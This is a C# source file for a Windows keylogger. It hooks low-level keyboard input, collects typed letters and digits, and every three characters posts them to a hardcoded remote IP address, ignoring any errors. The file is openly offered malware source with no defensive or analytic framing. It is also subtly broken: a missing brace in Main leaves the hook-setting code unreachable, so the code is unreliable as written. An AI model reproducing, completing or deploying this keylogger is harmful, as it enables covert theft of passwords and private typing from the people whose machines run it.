using System;
using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

class KeyLogger
{
    private static string URL = "http://94.108.5.83:7777";
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static StringBuilder buffer = new StringBuilder();
    private static bool capsLockOn = false;
    private static IntPtr hookId = IntPtr.Zero;

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc proc = HookCallback;

    static void Main()
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            Console.WriteLine("This keylogger only runs on Windows.");
            return;

        try
        {
            capsLockOn = GetCapsLockState();

            hookId = SetHook(proc);
            AppDomain.CurrentDomain.ProcessExit += (s, e) => UnhookWindowsHookEx(hookId);

            while (true)
            {
                Thread.Sleep(100);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Keylogger error: " + ex.Message);
        }
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            char keyChar = (char)vkCode;

            if (keyChar == 0x14) // Caps Lock
            {
                capsLockOn = !capsLockOn;
                return (IntPtr)1;
            }

            if (keyChar == '\b' && buffer.Length > 0)
            {
                buffer.Length--;
                return (IntPtr)1;
            }

            if (char.IsLetterOrDigit(keyChar))
            {
                keyChar = capsLockOn ? char.ToUpper(keyChar) : char.ToLower(keyChar);
                buffer.Append(keyChar);
            }

            if (buffer.Length >= 3)
            {
                string data = buffer.ToString();
                buffer.Clear();
                new Thread(() => SendToServer(data)).Start();
                Thread.Sleep(300);
            }
        }

        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    private static void SendToServer(string data)
    {
        try
        {
            using (HttpClient client = new HttpClient())
            {
                var postData = new StringContent($"data={Uri.EscapeDataString(data)}", Encoding.UTF8, "application/x-www-form-urlencoded");
                client.PostAsync(URL, postData).Wait();
            }
        }
        catch { /* Silently fail */ }
    }

    // Windows API Imports
    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    public static extern short GetKeyState(int keyCode);

    private static bool GetCapsLockState()
    {
        return (GetKeyState(0x14) & 0x0001) != 0;
    }
}
